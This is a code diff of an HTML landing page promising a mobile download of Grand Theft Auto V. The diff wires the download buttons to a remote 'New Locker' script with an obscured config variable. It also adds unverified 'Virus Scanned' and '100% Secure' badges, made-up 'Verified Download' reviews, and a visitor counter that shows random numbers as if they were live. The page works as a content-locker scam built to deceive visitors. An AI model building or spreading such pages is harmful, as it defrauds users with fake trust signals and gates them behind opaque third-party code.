@@ -21,6 +21,11 @@
     <!-- Font Awesome for Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 
+    <!-- New Locker CONFIG Script -->
+    <script type="text/javascript">
+        var zRqsx_ChU_HYkrzc={"it":4541291,"key":"759e0"};
+    </script>
+
     <style>
         html { scroll-behavior: smooth; }
         body { 
@@ -32,17 +37,34 @@
         
         /* Animation Keyframes */
         @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes slideInUp { from { opacity: 0; transform: translateY(100%); } to { opacity: 1; transform: translateY(0); } }
 
         /* Animation Classes */
         .animate-fadeInUp { animation: fadeInUp 0.7s ease-out forwards; }
-        .hidden { display: none; }
+
+        /* Visitor Counter Notification */
+        .visitor-notification {
+            animation: slideInUp 0.5s ease-out forwards;
+        }
+
+        /* Google Translate Widget Styles */
+        .skiptranslate { display: none !important; }
+        body { top: 0 !important; }
+        #google_translate_element { 
+            background: #1f2937; 
+            padding: 8px; 
+            border-radius: 8px;
+        }
     </style>
 </head>
 <body class="bg-gray-900 text-gray-200">
 
+    <!-- Google Translate Element -->
+    <div id="google_translate_element" class="fixed top-4 right-4 z-[100]"></div>
+
     <!-- Main Content -->
     <main class="container mx-auto px-4 py-12 flex items-center justify-center min-h-screen">
-        <div class="w-full max-w-2xl bg-gray-800 border border-gray-700 rounded-2xl shadow-2xl p-8 opacity-0 animate-fadeInUp">
+        <div class="w-full max-w-2xl bg-gray-800 border border-gray-700 rounded-2xl shadow-2xl p-8 opacity-0 animate-fadeInUp mt-12 sm:mt-0">
             
             <!-- Game Header -->
             <div class="flex flex-col sm:flex-row items-center sm:items-start text-center sm:text-left space-y-4 sm:space-y-0 sm:space-x-6 mb-6">
@@ -65,45 +87,121 @@
                 Grand Theft Auto V for mobile brings the sprawling city of Los Santos to your fingertips. Experience the interwoven stories of Michael, Franklin, and Trevor in this critically acclaimed open-world adventure. Explore the stunning world, complete missions, and cause mayhem on the go.
             </p>
 
+            <!-- Security Badges Section -->
+            <div class="grid grid-cols-2 sm:grid-cols-3 gap-4 text-center my-8">
+                <div class="bg-gray-900 p-3 rounded-lg">
+                    <i class="fas fa-shield-virus text-green-500 text-2xl mb-2"></i>
+                    <p class="text-xs font-semibold text-gray-300">Virus Scanned</p>
+                </div>
+                <div class="bg-gray-900 p-3 rounded-lg">
+                    <i class="fas fa-user-shield text-green-500 text-2xl mb-2"></i>
+                    <p class="text-xs font-semibold text-gray-300">Anti-Ban Protection</p>
+                </div>
+                <div class="bg-gray-900 p-3 rounded-lg col-span-2 sm:col-span-1">
+                    <i class="fas fa-check-circle text-green-500 text-2xl mb-2"></i>
+                    <p class="text-xs font-semibold text-gray-300">100% Secure</p>
+                </div>
+            </div>
+
             <!-- Download Section -->
             <div id="download-section" class="mt-6 grid grid-cols-1 sm:grid-cols-2 gap-4">
-                <button onclick="showCaptcha()" class="w-full flex items-center justify-center bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-lg transition-transform transform hover:scale-105">
+                <button onclick="_Cd()" class="w-full flex items-center justify-center bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-lg transition-transform transform hover:scale-105">
                     <i class="fab fa-android mr-2"></i> Download for Android
                 </button>
-                <button onclick="showCaptcha()" class="w-full flex items-center justify-center bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 rounded-lg transition-transform transform hover:scale-105">
+                <button onclick="_Cd()" class="w-full flex items-center justify-center bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 rounded-lg transition-transform transform hover:scale-105">
                     <i class="fab fa-apple mr-2"></i> Download for iOS
                 </button>
             </div>
 
-            <!-- Captcha Holder (Initially Hidden) -->
-            <div id="captcha-holder" class="mt-6 hidden">
-                <div data-captcha-enable="true"></div>
+            <!-- Back to Home Link -->
+            <div class="text-center mt-8">
+                <a href="https://apklingo.com" class="text-gray-400 hover:text-green-400 transition-colors duration-300 text-sm">
+                    <i class="fas fa-arrow-left mr-2"></i>Back to Main Page
+                </a>
+            </div>
+
+            <!-- Divider -->
+            <hr class="border-gray-700 my-8">
+
+            <!-- User Reviews Section -->
+            <div>
+                <h2 class="text-2xl font-bold text-center mb-6 text-white">What Players Are Saying</h2>
+                <div class="space-y-4">
+                    <!-- Review 1 -->
+                    <div class="bg-gray-900 p-4 rounded-lg">
+                        <div class="flex items-center mb-2">
+                            <div class="text-yellow-400">
+                                <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                            </div>
+                            <p class="ml-auto text-sm text-gray-400">Verified Download</p>
+                        </div>
+                        <p class="text-gray-300 italic">"I can't believe this works! Playing GTA V on my phone is a dream come true. Smooth experience."</p>
+                        <p class="font-semibold mt-2 text-green-400 text-right">- Karim A.</p>
+                    </div>
+                    <!-- Review 2 -->
+                    <div class="bg-gray-900 p-4 rounded-lg">
+                        <div class="flex items-center mb-2">
+                            <div class="text-yellow-400">
+                                <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i>
+                            </div>
+                            <p class="ml-auto text-sm text-gray-400">Verified Download</p>
+                        </div>
+                        <p class="text-gray-300 italic">"The process was simple and it worked perfectly on my Android device. Highly recommended!"</p>
+                        <p class="font-semibold mt-2 text-green-400 text-right">- Mona S.</p>
+                    </div>
+                </div>
             </div>
             
         </div>
     </main>
 
+    <!-- Live Visitor Notification -->
+    <div id="visitor-notification" class="hidden fixed bottom-5 left-5 bg-gray-800 border border-gray-700 text-white p-4 rounded-lg shadow-lg visitor-notification">
+        <div class="flex items-center">
+            <div class="relative mr-3">
+                <i class="fas fa-circle text-green-500 text-xs"></i>
+                <i class="fas fa-circle text-green-500 text-xs absolute top-0 left-0 animate-ping"></i>
+            </div>
+            <div>
+                <span id="visitor-count" class="font-bold">42</span> people are currently on this page.
+            </div>
+        </div>
+    </div>
+    
+    <!-- New Locker MAIN Script -->
+    <script src="https://dlk457skl57zp.cloudfront.net/971a9db.js"></script>
+
+    <!-- Google Translate Script -->
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
+        }
+    </script>
+    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
     <script>
         // --- INITIAL RENDER ---
         document.addEventListener('DOMContentLoaded', () => {
             document.querySelectorAll('.animate-fadeInUp').forEach(el => el.style.opacity = '1');
+
+            // --- Live Visitor Counter Logic ---
+            const visitorNotification = document.getElementById('visitor-notification');
+            const visitorCountEl = document.getElementById('visitor-count');
+            let currentVisitors = Math.floor(Math.random() * 31) + 20; // Start with a random number between 20 and 50
+
+            setTimeout(() => {
+                visitorCountEl.textContent = currentVisitors;
+                visitorNotification.classList.remove('hidden');
+            }, 3000);
+
+            setInterval(() => {
+                const change = Math.floor(Math.random() * 5) - 2; // Change by -2, -1, 0, 1, or 2
+                currentVisitors += change;
+                if (currentVisitors < 15) { currentVisitors = 15; }
+                visitorCountEl.textContent = currentVisitors;
+            }, (Math.random() * 4000) + 3000); // Update every 3-7 seconds
         });
-
-        // Function to show the captcha locker
-        function showCaptcha() {
-            const downloadSection = document.getElementById('download-section');
-            const captchaHolder = document.getElementById('captcha-holder');
-            
-            // Hide the buttons
-            downloadSection.classList.add('hidden');
-            
-            // Show the captcha container
-            captchaHolder.classList.remove('hidden');
-        }
     </script>
-
-    <!-- New Captcha Locker Script -->
-    <script type="text/javascript" src="https://locked3.com/cp/js/x6pyk"></script>
-
 </body>
 </html>
+
